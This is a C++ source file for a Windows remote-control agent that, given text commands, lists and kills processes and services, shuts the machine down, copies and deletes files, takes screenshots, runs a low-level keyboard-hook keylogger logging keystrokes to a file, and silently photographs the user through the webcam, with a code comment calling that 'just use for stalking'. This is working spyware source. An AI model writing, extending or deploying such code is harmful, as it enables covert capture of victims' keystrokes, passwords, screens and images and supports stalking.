#include "utils.h"

VideoCapture* cap = nullptr;
HHOOK hHook = NULL;
atomic<bool> keepKeyloggerRunning;
ofstream fo;
wstringstream inp;
wstringstream out;

map<wstring, map<wstring, function<void()>>> setupHandlers() {
    return map<wstring, map<wstring, function<void()>>>{
        {
            L"list", 
            map<wstring, function<void()>>{
                { L"app", listProcesses },
                { L"service", listServices }
            }
        },
        {
            L"start",
            map<wstring, function<void()>>{
                {
                    L"app", 
                    [] {
                        wstring appName;
                        inp >> appName;
                        startApp((wchar_t*)appName.c_str());
                    }
                },
                {
                    L"service",
                    [] {
                        wstring serviceName;
                        inp >> serviceName;
                        startServiceByName((wchar_t*)serviceName.c_str());
                    }
                },
                {
                    L"camera", startCamera
                },
                {
                    L"keylogger", startKeylogger
                }
            }
        },
        {
            L"stop",
            map<wstring, function<void()>>{
                {
                    L"app", 
                    [] {
                        unsigned long procID;
                        inp >> procID;
                        stopApp(procID);
                    }
                },
                {
                    L"service",
                    [] {
                        wstring serviceName;
                        inp >> serviceName;
                        stopServiceByName((wchar_t*)serviceName.c_str());
                    }
                },
                {
                    L"camera", stopCamera
                },
                {
                    L"keylogger", stopKeylogger
                }
            }
        },
        {
            L"power",
            map<wstring, function<void()>>{
                { L"shutdown", shutdownMachine },
                { L"restart", restartMachine }
            }
        },
        {
            L"file",
            map<wstring, function<void()>>{
                {
                    L"copy",
                    [] {
                        wstring srcPath, desPath;
                        inp >> srcPath >> desPath;
                        copyFile((wchar_t*)srcPath.c_str(), (wchar_t*)desPath.c_str());
                    }
                },
                {
                    L"delete",
                    [] {
                        wstring filePath;
                        inp >> filePath;
                        deleteFile((wchar_t*)filePath.c_str());
                    }
                }
            }
        },
        {
            L"capture",
            map<wstring, function<void()>>{
                { 
                    L"screen", 
                    [] {
                        wstring outputPath;
                        inp >> outputPath;
                        captureScreen(outputPath);
                    }
                }
            }
        }
    };
}

void listProcesses() {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    out << "\n Process ID | " << setw(26) << right << "Executable\n";
    out << wstring(12, '-') << "o" << wstring(40, '-') << endl;
    if (Process32First(snapshot, &entry)) {
        do {
            out << setw(11) << right << entry.th32ProcessID << " | " << entry.szExeFile << endl;
        } while (Process32Next(snapshot, &entry));
    }
    else {
        out << "\nFailed to list processes.\n";
    }
    CloseHandle(snapshot);
}

void startApp(wchar_t* appPath) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcess(NULL, appPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        out << "\nProcess started successfully.\n";
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        out << "\nFailed to start process.\n";
    }
}

void stopApp(DWORD processID) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);
    if (hProcess) {
        if (TerminateProcess(hProcess, 0)) {
            out << "\nProcess stopped successfully.\n";
        }
        else {
            out << "\nFailed to stop process.\n";
        }
        CloseHandle(hProcess);
    }
    else {
        out << "\nFailed to open process.\n";
    }
}

void listServices() {
    SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scmHandle) {
        out << "\nOpenSCManager failed with error: " << GetLastError() << endl;
        return;
    }
    
    DWORD bytesNeeded = 0, servicesCount = 0, resumeHandle = 0;
    EnumServicesStatus(scmHandle, SERVICE_WIN32, SERVICE_STATE_ALL, nullptr, 0, &bytesNeeded, &servicesCount, &resumeHandle);

    vector<BYTE> buffer(bytesNeeded);
    ENUM_SERVICE_STATUS* serviceStatus = reinterpret_cast<ENUM_SERVICE_STATUS*>(buffer.data());
    if (!EnumServicesStatus(scmHandle, SERVICE_WIN32, SERVICE_STATE_ALL, serviceStatus, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle)) {
        out << "\nEnumServicesStatus failed with error: " << GetLastError() << endl;
        CloseServiceHandle(scmHandle);
        return;
    }

    out << "\n" << setw(31) << right << "Service Name" << setw(22) << " | " << setw(57) << "Display Name" << setw(54) << " |  Status\n";
    out << wstring(51, '-') << "o" << wstring(102, '-') << "o" << wstring(10, '-') << endl;
    for (DWORD i = 0; i < servicesCount; ++i) {
        out << setw(50) << left << wstring(serviceStatus[i].lpServiceName) << " | " << setw(100) << wstring(serviceStatus[i].lpDisplayName) << " | " << (serviceStatus[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "Running" : "Stopped") << endl;
    }
    
    CloseServiceHandle(scmHandle);
}

void startServiceByName(LPCWSTR serviceName) {
    SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scmHandle) {
        out << "\nOpenSCManager failed with error: " << GetLastError() << endl;
        return;
    }

    SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName, SERVICE_START);
    if (!serviceHandle) {
        out << "\nOpenService failed with error: " << GetLastError() << endl;
        CloseServiceHandle(scmHandle);
        return;
    }

    if (!StartService(serviceHandle, 0, nullptr)) {
        out << "\nStartService failed with error: " << GetLastError() << endl;
    }
    else {
        out << "\nService started successfully." << endl;
    }
    
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
}

void stopServiceByName(LPCWSTR serviceName) {
    SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scmHandle) {
        out << "\nOpenSCManager failed with error: " << GetLastError() << endl;
        return;
    }

    SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName, SERVICE_STOP);
    if (!serviceHandle) {
        out << "\nOpenService failed with error: " << GetLastError() << endl;
        CloseServiceHandle(scmHandle);
        return;
    }

    SERVICE_STATUS status;
    if (!ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status)) {
        out << "\nControlService failed with error: " << GetLastError() << endl;
    }
    else {
        out << "\nService stopped successfully." << endl;
    }

    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
}

void shutdownMachine() {
    if (!enableShutdownPrivilege()) {
        return;
    }
    if (InitiateSystemShutdownEx(NULL, NULL, 0, TRUE, FALSE, REASON_OTHER)) {
        out << "\nShutdown initiated successfully.\n";
    }
    else {
        out << "\nFailed to initiate shutdown.\n";
    }
}

void restartMachine() {
    if (!enableShutdownPrivilege()) {
        return;
    }
    if (InitiateSystemShutdownEx(NULL, NULL, 0, TRUE, TRUE, REASON_OTHER)) {
        out << "\nRestart initiated successfully.\n";
    }
    else {
        out << "\nFailed to initiate restart.\n";
    }
}

void copyFile(LPCWSTR src, LPCWSTR dest) {
    if (CopyFile(src, dest, FALSE)) {
        out << "\nFile copied successfully.\n";
    }
    else {
        out << "\nFailed to copy file.\n";
    }
}

void deleteFile(LPCWSTR filePath) {
    if (DeleteFile(filePath)) {
        out << "\nFile deleted successfully.\n";
    }
    else {
        out << "\nFailed to delete file.\n";
    }
}

void captureScreen(wstring outputPath) {
    // Get the desktop device context (DC)
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    // Use device-independent pixels (DPI scaling) to get the actual screen resolution
    HDC hdc = GetDC(NULL);
    int screenWidth = GetDeviceCaps(hdc, DESKTOPHORZRES);  // Actual width in pixels
    int screenHeight = GetDeviceCaps(hdc, DESKTOPVERTRES); // Actual height in pixels

    // Create a compatible bitmap for the screen DC
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    SelectObject(hMemoryDC, hBitmap);

    // Copy the screen content to the memory DC
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

    // Convert the HBITMAP to a Mat
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    // Prepare the OpenCV Mat structure
    Mat mat(screenHeight, screenWidth, CV_8UC4);  // 4 channels: BGRA format

    // Copy the bitmap data into the OpenCV Mat
    GetBitmapBits(hBitmap, bmp.bmHeight * bmp.bmWidthBytes, mat.data);

    // Clean up
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hdc);
    ReleaseDC(NULL, hScreenDC);

    // Convert BGRA to BGR (OpenCV default color format)
    Mat bgrMat;
    cvtColor(mat, bgrMat, COLOR_BGRA2BGR);

    // Check if the capture was successful
    if (!bgrMat.empty()) {
        // Save the captured screen to a file
        if (imwrite(string(outputPath.begin(), outputPath.end()), bgrMat)) {
            out << "\nScreenshot saved as " << outputPath << endl;
        }
        else {
            out << "\nFailed to save the screenshot.\n";
        }
    }
    else {
        out << "\nFailed to capture screen.\n";
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKBDLLHookStruct = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            // Get the virtual key code
            UINT vkCode = pKBDLLHookStruct->vkCode;

            // Prepare buffer for the key name
            vector<wchar_t> keyName(256);

            // Print the key name if the result is positive
            BYTE keyboardState[256];
            if (GetKeyboardState(keyboardState)) {
                int result = ToUnicodeEx(vkCode, 0, keyboardState, keyName.data(), keyName.size(), 0, GetKeyboardLayout(0));
                if (result > 0 && 32 <= vkCode && vkCode < 126) {
                    fo.write((const char*)keyName.data(), result);
                    fo << " ";
                }
                else {
                    fo << vkCode << " ";
                }
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void KeyloggerThread() {
    // Set the hook for the keyboard
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
    
    // Message loop to keep the hook alive
    MSG msg;
    while (keepKeyloggerRunning) {
        // Check for messages with a timeout
        if (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        else {
            // Sleep to avoid busy waiting
            this_thread::sleep_for(chrono::milliseconds(10));
        }
    }

    // Unhook when done
    UnhookWindowsHookEx(hHook);
}

void startKeylogger() {
    string path = filesystem::current_path().string() + "/keylogger.txt";
    fo.open(path);
    keepKeyloggerRunning = true;
    thread keyloggerThread(KeyloggerThread);
    keyloggerThread.detach(); // Detach the thread to run independently
    out << "\nKeylogger started successfully.\n";
}

void stopKeylogger() {
    keepKeyloggerRunning = false;
    // Post a message to wake up the message loop
    PostThreadMessage(GetCurrentThreadId(), WM_QUIT, 0, 0);
    out << "\nKeylogger stopped successfully.\n";
    fo.close();
}

void startCamera() {
    cap = new VideoCapture(0);
    cap->set(cv::CAP_PROP_FRAME_WIDTH, 1280);
    cap->set(cv::CAP_PROP_FRAME_HEIGHT, 720);
    Mat frame;
    *cap >> frame;
    string path = filesystem::current_path().string() + "/webcam.png";
    imwrite(path, frame); // Just use for stalking =))

    if (cap->isOpened()) {
        out << "\nWebcam opened successfully.\n";
    }
    else {
        out << "\nFailed to open webcam.\n";
    }
}

void stopCamera() {
    if (cap && cap->isOpened()) {
        cap->release();
        destroyAllWindows();
        out << "\nWebcam closed successfully.\n";
    }
    else {
        out << "\nError: Webcam is not open.\n";
    }
}

bool enableShutdownPrivilege() {
    HANDLE token;
    TOKEN_PRIVILEGES tkp;

    // Open a handle to the process's access token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        out << "\nFailed to open process token. Error: " << GetLastError() << endl;
        return false;
    }

    // Look up the LUID for the shutdown privilege
    if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
        out << "\nFailed to lookup privilege value. Error: " << GetLastError() << endl;
        CloseHandle(token);
        return false;
    }

    tkp.PrivilegeCount = 1;  // We are enabling one privilege
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust the token's privileges to enable shutdown privilege
    if (!AdjustTokenPrivileges(token, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
        out << "\nFailed to adjust token privileges. Error: " << GetLastError() << endl;
        CloseHandle(token);
        return false;
    }

    CloseHandle(token);
    return true;
}